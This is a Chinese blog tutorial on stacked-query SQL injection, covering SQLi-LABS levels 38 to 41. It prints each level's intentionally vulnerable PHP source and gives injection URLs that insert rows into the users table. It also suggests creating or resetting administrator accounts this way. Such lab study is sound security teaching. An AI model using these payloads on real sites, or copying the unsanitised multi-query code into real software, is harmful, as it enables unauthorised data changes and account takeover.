# 原创
：  web漏洞-SQL注入漏洞扩展(堆叠查询注入)-SQLi LABS 38关到41关讲解

# web漏洞-SQL注入漏洞扩展(堆叠查询注入)-SQLi LABS 38关到41关讲解

## 一、概念

堆叠注入(stacked injections)从名词的含义就可以看出应该是一堆sql语句（多条）一起执行。

而在真实的运用中也是这样的，我们知道在mysql 中，主要是命令行中，每一条语句结尾加;表示语句结束，这样我们就想到了是不是可以多条sql语句一起使用。

而 联合注入（union injection）也是将两条语句合并在一起，两者之间有什么区别么? 区别就在于 union或者 union all 执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。

## 二、局限性

堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引警不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。

## 三、mysql数据库命令行内举例

```
mysql&gt;  select * from users;select * from emails;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 13 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)

+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
+----+------------------------+
8 rows in set (0.05 sec)
```

```
相当于当注入内容为“1;select * from emails;”时：
mysql&gt;  select * from users where id = 1;select * from emails;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Dumb     | Dumb     |
+----+----------+----------+
1 row in set (0.00 sec)

+----+------------------------+
| id | email_id               |
+----+------------------------+
|  1 | Dumb@dhakkan.com       |
|  2 | Angel@iloveu.com       |
|  3 | Dummy@dhakkan.local    |
|  4 | secure@dhakkan.local   |
|  5 | stupid@dhakkan.local   |
|  6 | superman@dhakkan.local |
|  7 | batman@dhakkan.local   |
|  8 | admin@dhakkan.com      |
+----+------------------------+
8 rows in set (0.00 sec)
```

## 四、用处

比如在注入时，需要得到管理员的账号和密码，但是这个密码是加密的，且无法解密，此时便可以利用堆叠注入向管理员用户的表内进行插入用户数据，创建用户来登录迂回的注入数据库，但是前提是网站的管理员必须是高权限才能完全创建用户。因为是插入的数据，所以新插入的管理员用户的密码是自定义的，将用户数据插入之后，就可以实施登录了，此时便可以忽略密码无法解密的问题。也可以使用update更新管理员用户密码。

## 五、实例

### &lt;SQLi-LABS-Less38&gt;

#### 1.靶场原码

```
&lt;?php
error_reporting(0);
include("../sql-connections/db-creds.inc");
?&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-38 **stacked Query**&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
&lt;font size="3" color="#FFFF00"&gt;


&lt;?php




// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity
//mysql connections for stacked query examples.
$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
// Check connection
if (mysqli_connect_errno($con1))
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
else
{
    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");
}



$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
{
    
    
    /* store first result set */
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {
            echo '&lt;font size = "5" color= "#00FF00"&gt;';    
            printf("Your Username is : %s", $row[1]);
            echo "&lt;br&gt;";
            printf("Your Password is : %s", $row[2]);
            echo "&lt;br&gt;";
            echo "&lt;/font&gt;";
        }
//            mysqli_free_result($result);
    }
        /* print divider */
    if (mysqli_more_results($con1))
    {
            //printf("-----------------\n");
    }
     //while (mysqli_next_result($con1));
}
else 
    {
    echo '&lt;font size="5" color= "#FFFF00"&gt;';
    print_r(mysqli_error($con1));
    echo "&lt;/font&gt;";  
    }
/* close connection */
mysqli_close($con1);


}
    else { echo "Please input the ID as parameter with numeric value";}

?&gt;
&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src="../images/Less-38.jpg" /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 2.SQL语句

```
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

#### 3.修改靶场网页原码，使得执行的SQL语句在网页中展示，方便观察。

在原码中添加“echo $sql."&lt;br&gt;";”（返回执行的SQL语句并换行）。

#### 4.首先在数据库命令提示符里查看所有用户信息。

```
mysql&gt;  select * from users;
+----+----------+------------+
| id | username | password   |
+----+----------+------------+
|  1 | Dumb     | Dumb       |
|  2 | Angelina | I-kill-you |
|  3 | Dummy    | p@ssword   |
|  4 | secure   | crappy     |
|  5 | stupid   | stupidity  |
|  6 | superman | genious    |
|  7 | batman   | mob!le     |
|  8 | admin    | admin      |
|  9 | admin1   | admin1     |
| 10 | admin2   | admin2     |
| 11 | admin3   | admin3     |
| 12 | dhakkan  | dumbo      |
| 13 | admin4   | admin4     |
+----+----------+------------+
13 rows in set (0.00 sec)
```

#### 5.在网页内进行注入操作

```
localhost/sqli-labs/Less-38/?id=1';insert into users(id,username,password) values (100,'less38', 'hello')--+
```

#### 6.再次在数据库命令提示符里查看所有用户信息。

可以看到，数据库内较上一次查询多了一条用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  14 | admin4   | admin4     |
| 100 | less38   | hello      |
+-----+----------+------------+
14 rows in set (0.00 sec)
```

---


### &lt;SQLi-LABS-Less39&gt;

通过观察网页原码可知，此关与Less38的区别是注入类型不同，Less38是字符型注入，而此关是数字型注入。

#### 1.靶场原码

```
&lt;?php
error_reporting(0);
include("../sql-connections/db-creds.inc");
?&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-39 **stacked Query Intiger type**&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
&lt;font size="3" color="#FFFF00"&gt;


&lt;?php




// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity
//mysql connections for stacked query examples.
$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
// Check connection
if (mysqli_connect_errno($con1))
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
else
{
    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");
}



$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
{
    
    
    /* store first result set */
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {
            echo '&lt;font size = "5" color= "#00FF00"&gt;';    
            printf("Your Username is : %s", $row[1]);
            echo "&lt;br&gt;";
            printf("Your Password is : %s", $row[2]);
            echo "&lt;br&gt;";
            echo "&lt;/font&gt;";
        }
//            mysqli_free_result($result);
    }
        /* print divider */
    if (mysqli_more_results($con1))
    {
            //printf("-----------------\n");
    }
     //while (mysqli_next_result($con1));
}
else 
    {
    echo '&lt;font size="5" color= "#FFFF00"&gt;';
    print_r(mysqli_error($con1));
    echo "&lt;/font&gt;";  
    }
/* close connection */
mysqli_close($con1);

}
    else { echo "Please input the ID as parameter with numeric value";}

?&gt;
&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src="../images/Less-39.jpg" /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 2.SQL语句

```
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

#### 3.修改靶场网页原码，使得执行的SQL语句在网页中展示，方便观察。

在原码中添加“echo $sql."&lt;br&gt;";”（返回执行的SQL语句并换行）。

#### 4.首先在数据库命令提示符里查看所有用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  14 | admin4   | admin4     |
| 100 | less38   | hello      |
+-----+----------+------------+
14 rows in set (0.00 sec)
```

#### 5.在网页内进行注入操作

```
http://localhost/sqli-labs/Less-39/?id=1;insert%20into%20users(id,username,password)%20%20values%20(%27101%27,%27less39%27,%27hello%27)--+
```

#### 6.再次在数据库命令提示符里查看所有用户信息。

可以看到，数据库内较上一次查询多了一条用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  13 | admin4   | admin4     |
| 100 | less38   | hello      |
| 101 | less39   | hello      |
+-----+----------+------------+
15 rows in set (0.00 sec)
```

---


### &lt;SQLi-LABS-Less40&gt;

#### 1.靶场原码

```
&lt;?php
error_reporting(0);
include("../sql-connections/db-creds.inc");
?&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-40 **stacked Query String type Blind**&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
&lt;font size="3" color="#FFFF00"&gt;


&lt;?php




// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity
//mysql connections for stacked query examples.
$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
// Check connection
if (mysqli_connect_errno($con1))
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
else
{
    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");
}



$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
{
    
    
    /* store first result set */
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {
            echo '&lt;font size = "5" color= "#00FF00"&gt;';    
            printf("Your Username is : %s", $row[1]);
            echo "&lt;br&gt;";
            printf("Your Password is : %s", $row[2]);
            echo "&lt;br&gt;";
            echo "&lt;/font&gt;";
        }
//            mysqli_free_result($result);
    }
        /* print divider */
    if (mysqli_more_results($con1))
    {
            //printf("-----------------\n");
    }
     //while (mysqli_next_result($con1));
}


/* close connection */
mysqli_close($con1);


}
    else { echo "Please input the ID as parameter with numeric value";}

?&gt;
&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src="../images/Less-40.jpg" /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 2.SQL语句

```
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```

#### 3.修改靶场网页原码，使得执行的SQL语句在网页中展示，方便观察。

在原码中添加“echo $sql."&lt;br&gt;";”（返回执行的SQL语句并换行）。

#### 4.首先在数据库命令提示符里查看所有用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  13 | admin4   | admin4     |
| 100 | less38   | hello      |
| 101 | less39   | hello      |
+-----+----------+------------+
15 rows in set (0.00 sec)
```

#### 5.在网页内进行注入操作

```
http://localhost/sqli-labs/Less-40/?id=1%27);%20insert%20into%20users(id,username,%20password)%20values%20(%27102%27,%27less40%27,%27hello%27)--+
```

#### 6.再次在数据库命令提示符里查看所有用户信息。

可以看到，数据库内较上一次查询多了一条用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  13 | admin4   | admin4     |
| 100 | less38   | hello      |
| 101 | less39   | hello      |
| 103 | less40   | hello      |
+-----+----------+------------+
16 rows in set (0.00 sec)
```

### &lt;SQLi-LABS-Less41&gt;

此关与Less39的区别在于 Less41 错误不回显，即盲注。

#### 1.靶场原码

```
&lt;?php
error_reporting(0);
include("../sql-connections/db-creds.inc");
?&gt;
&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;
&lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=utf-8" /&gt;
&lt;title&gt;Less-41 **stacked Query Intiger type blind**&lt;/title&gt;
&lt;/head&gt;

&lt;body bgcolor="#000000"&gt;
&lt;div style=" margin-top:70px;color:#FFF; font-size:23px; text-align:center"&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color="#FF0000"&gt; Dhakkan &lt;/font&gt;&lt;br&gt;
&lt;font size="3" color="#FFFF00"&gt;


&lt;?php




// take the variables 
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity
//mysql connections for stacked query examples.
$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);
// Check connection
if (mysqli_connect_errno($con1))
{
    echo "Failed to connect to MySQL: " . mysqli_connect_error();
}
else
{
    @mysqli_select_db($con1, $dbname) or die ( "Unable to connect to the database: $dbname");
}



$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
/* execute multi query */
if (mysqli_multi_query($con1, $sql))
{
    
    
    /* store first result set */
    if ($result = mysqli_store_result($con1))
    {
        if($row = mysqli_fetch_row($result))
        {
            echo '&lt;font size = "5" color= "#00FF00"&gt;';    
            printf("Your Username is : %s", $row[1]);
            echo "&lt;br&gt;";
            printf("Your Password is : %s", $row[2]);
            echo "&lt;br&gt;";
            echo "&lt;/font&gt;";
        }
//            mysqli_free_result($result);
    }
        /* print divider */
    if (mysqli_more_results($con1))
    {
            //printf("-----------------\n");
    }
     //while (mysqli_next_result($con1));
}


/* close connection */
mysqli_close($con1);


}
    else { echo "Please input the ID as parameter with numeric value";}

?&gt;
&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;
&lt;img src="../images/Less-41.jpg" /&gt;&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
```

#### 2.SQL语句

```
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

#### 3.修改靶场网页原码，使得执行的SQL语句在网页中展示，方便观察。

在原码中添加“echo $sql."&lt;br&gt;";”（返回执行的SQL语句并换行）。

#### 4.首先在数据库命令提示符里查看所有用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  13 | admin4   | admin4     |
| 100 | less38   | hello      |
| 101 | less39   | hello      |
| 103 | less40   | hello      |
+-----+----------+------------+
16 rows in set (0.00 sec)
```

#### 5.在网页内进行注入操作

```
http://localhost/sqli-labs/Less-41/?id=1;%20insert%20into%20users(id,username,password)%20values%20(%27104%27,%27less41%27,%27hello%27)--+
```

#### 6.再次在数据库命令提示符里查看所有用户信息。

可以看到，数据库内较上一次查询多了一条用户信息。

```
mysql&gt; select * from users;
+-----+----------+------------+
| id  | username | password   |
+-----+----------+------------+
|   1 | Dumb     | Dumb       |
|   2 | Angelina | I-kill-you |
|   3 | Dummy    | p@ssword   |
|   4 | secure   | crappy     |
|   5 | stupid   | stupidity  |
|   6 | superman | genious    |
|   7 | batman   | mob!le     |
|   8 | admin    | admin      |
|   9 | admin1   | admin1     |
|  10 | admin2   | admin2     |
|  11 | admin3   | admin3     |
|  12 | dhakkan  | dumbo      |
|  13 | admin4   | admin4     |
| 100 | less38   | hello      |
| 101 | less39   | hello      |
| 103 | less40   | hello      |
| 104 | less41   | hello      |
+-----+----------+------------+
17 rows in set (0.00 sec)
```
